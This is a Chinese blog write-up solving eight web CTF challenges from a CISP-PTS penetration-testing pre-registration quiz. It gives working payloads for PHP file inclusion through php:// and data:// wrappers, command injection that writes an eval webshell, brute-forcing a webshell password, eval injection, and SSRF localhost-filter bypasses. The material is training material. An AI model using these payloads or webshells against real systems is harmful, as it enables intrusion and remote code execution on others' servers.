# PTS 谷安预报名测试


&lt;!--more--&gt;

最近想考PTS，想先了解一下相关内容，朋友就给我发了一个谷安的问卷调查，上面有些CTF题，做着玩玩。



题目来源：

谷安学院CISP-PTS渗透测试专家认证-预报名测试
https://ks.wjx.top/jq/94623813.aspx

&gt; 问卷为谷安学院渗透测试专家CISP-PTS认证预报名测试题。 
&gt;
&gt; 3道实操题目答对2道即可报名PTS。



## 1、POST&amp;GET

题目链接：http://118.195.198.108:9997/

&gt; :bulb: hint：
&gt;
&gt; 请以get方式提交a=1 post方式提交b=2给服务器

Poc:

```http
POST /?a=1 HTTP/1.1
Host: 118.195.198.108:9997
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

b=2
```

返回key，`key1:T0kS7r3c`



## 2、include

题目链接：http://118.195.198.108:9998/

&gt; :bulb:Hint:
&gt;
&gt; ```php
&gt; &lt;?php
&gt; show_source(__FILE__);
&gt; echo $_GET[&#39;hello&#39;];
&gt; $page=$_GET[&#39;page&#39;];
&gt; //while (strstr($page, &#34;php://&#34;)) {
&gt; //    $page=str_replace(&#34;php://&#34;, &#34;&#34;, $page);
&gt; //}
&gt; include($page);
&gt; ?&gt;
&gt; ```

利用点就是`include($page);`，注释中提示了`php://`伪协议

Poc:

```
?hello=&amp;page=php://filter/read=convert.base64-encode/resource=flag.php 
?hello=&amp;page=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;
```

考点：文件包含漏洞，伪协议

```http
POST /?hello=&amp;page=php://input HTTP/1.1
Host: 118.195.198.108:9998
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

&lt;?php system(&#39;cat flag.php&#39;);?&gt;
```





## 3、Hacked by Alphabug

题目链接：http://118.195.198.108:9999/

&gt; :bulb: Hint:
&gt;
&gt; ```php
&gt; 0 &lt;?php
&gt;     #Hacked by Alphabug 
&gt; header(&#34;Content-type:text/html;charset=utf-8&#34;); 
&gt;     /*
&gt;     Hint:
&gt;     get the shell find the key；）\n&#34;;
&gt;     */
&gt;     $sandbox = &#39;/var/www/html/sandbox/&#39; . md5(&#34;M0rk&#34; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
&gt;     mkdir($sandbox,0777,true);
&gt;     chdir($sandbox);
&gt;     echo strlen($_GET[&#39;cmd&#39;]);
&gt;     if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 30) {
&gt;         @exec($_GET[&#39;cmd&#39;]);
&gt;     } else if (isset($_GET[&#39;reset&#39;])) {
&gt;         @exec(&#39;/bin/rm -rf &#39; . $sandbox);
&gt;     }
&gt;     highlight_file(__FILE__);
&gt; echo &#34;&lt;br /&gt; IP : {$_SERVER[&#39;REMOTE_ADDR&#39;]}&#34;;
&gt; 
&gt; ?&gt;
&gt; 
&gt; IP : xxxxxx
&gt; ```



`md5(&#34;M0rk&#34; . $_SERVER[&#39;REMOTE_ADDR&#39;])`算出自己的sandbox地址。

通过`cmd`进行写shell，为了及时发现自己的错误，可以先写txt，再通过cp命令转成php

```php
?cmd=echo&#43;&#39;&lt;?php&#39;&gt;&gt;i.txt
?cmd=echo&#43;&#39;$a=$_POST[&#34;a&#34;];&#39;&gt;&gt;i.txt
?cmd=echo&#43;&#39;eval($a);&#39;&gt;&gt;i.txt
?cmd=cp&#43;i.txt&#43;i.php
```

连接shell，获取flag



## 4、密码是什么呢？

&gt; :bulb:Hint
&gt;
&gt; 密码是什么呢？
&gt; &lt;?php @eval($_POST[&#39;?&#39;]);?&gt;

暴破一句话木马的连接密码

PHP一句话可以执行PHP命令，为了方便暴破，我们可以使用PHP echo输出内容，改变响应包的大小来做区分。

```http
POST / HTTP/1.1
Host: 118.195.198.108:20001
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

cmd=echo 123456789;
```

对cmd参数加标记，进行暴破，观察响应包大小变化，最后变化的就是密码，密码为pass

进行命令控制，读取flag

```
pass=echo `ls`;
pass=echo `cat 3daddreEt30Nx.txt`;
```



## 5、var_dump

&gt; :bulb:Hint
&gt;
&gt; ```php
&gt; Warning: var_dump() expects at least 1 parameter, 0 given in /var/www/html/index.php(4) : eval()&#39;d code on line 1
&gt; &lt;?php 
&gt;     #error_reporting(0);
&gt;     $a = @$_REQUEST[&#39;hello&#39;]; 
&gt;     eval( &#34;var_dump($a);&#34;); 
&gt;     show_source (__FILE__); 
&gt; ?&gt; 
&gt; ```

命令注入，闭合`var_dump`

POC：

```
/?hello=);echo`ls`;//
/?hello=);echo`cat x8kwjkzp1ik.txt`;//
```



## 6、curl_exec

&gt; :bulb:Hint
&gt;
&gt; ```php
&gt; &lt;?php
&gt; error_reporting(0);
&gt; highlight_file(__FILE__);
&gt; $url=$_POST[&#39;url&#39;];
&gt; $x=parse_url($url);
&gt; if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
&gt;     if(!preg_match(&#39;/localhost|127.0.0.1/&#39;,$x[&#39;host&#39;])){
&gt;         $ch=curl_init($url);
&gt;         curl_setopt($ch, CURLOPT_HEADER, 0);
&gt;         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
&gt;         $result=curl_exec($ch);
&gt;         curl_close($ch);
&gt;         echo ($result);
&gt;     }else{
&gt;      die(&#39;hacker&#39;);
&gt;     }
&gt; }elseif ($x[&#39;scheme&#39;]== NULL){
&gt;     die(&#39;&#39;);
&gt; }else {
&gt;     die(&#39;oh no hacker&#39;);
&gt; }
&gt; 
&gt; ?&gt;
&gt; //flag.php
&gt; ```

`url=http://xxxxxx/flag.php`

考点，对localhost、127.0.0.1的绕过

```
127.0.0.1
十进制整数：url=http://2130706433/flag.php
十六进制：url=http://0x7F.0.0.1/flag.php
八进制：url=http://0177.0.0.1/flag.php
十六进制整数：url=http://0x7F000001/flag.php
缺省模式：127.0.0.1写成127.1
CIDR：url=http://127.127.127.127/flag.php
url=http://0/flag.php
url=http://0.0.0.0/flag.php
```

经过尝试，只有如下成功绕过，其他会造成400报错

```
url=http://127.127.127.127/flag.php
url=http://0x7F000001/flag.php
url=http://0.0.0.0/flag.php
```



## 7、你真的会使用webshell吗？

&gt; :bulb:Hint
&gt;
&gt; 你真的会使用webshell吗？
&gt; &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;

不会



## 8、Hello English

&gt; :bulb:Hint
&gt;
&gt; ```php
&gt; &lt;?php
&gt; if( !ini_get(&#39;display_errors&#39;) ) {
&gt;   ini_set(&#39;display_errors&#39;, &#39;On&#39;);
&gt;   }
&gt; error_reporting(E_ALL);
&gt; $lan = $_COOKIE[&#39;language&#39;];
&gt; if(!$lan)
&gt; {
&gt; 	@setcookie(&#34;language&#34;,&#34;english&#34;);
&gt; 	@include(&#34;english.php&#34;);
&gt; }
&gt; else
&gt; {
&gt; 	@include($lan.&#34;.php&#34;);
&gt; }
&gt; $x=file_get_contents(&#39;index.php&#39;);
&gt; echo $x;
&gt; ?&gt;
&gt; ```



Poc:

```
Cookie: language=data:text/plain,&lt;?php phpinfo()%3b?&gt;
Cookie: language=php://filter/read=convert.base64-encode/resource=./flag
```



---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/  

